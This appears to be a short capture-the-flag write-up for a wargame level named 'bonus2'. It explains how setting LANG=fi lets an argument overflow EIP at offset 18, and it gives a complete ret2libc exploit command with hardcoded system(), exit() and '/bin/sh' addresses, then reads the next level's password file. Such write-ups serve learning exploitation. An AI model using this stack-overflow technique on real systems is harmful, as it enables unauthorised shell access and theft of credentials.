program does getenv("LANG")
then check if its "fi", "ln"
if we try to overflow with our two params we can see that just two bytes can overflow with LANG=en
but with :
export LANG=fi
we can overflow on eip
with a pattern we see that the index is 18
so we write the adresses of system(), exit() and "/bin/sh"
./bonus2 `python -c 'print("a"*100)'` `python -c 'print("b"*18 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
cat /home/user/bonus3/.pass
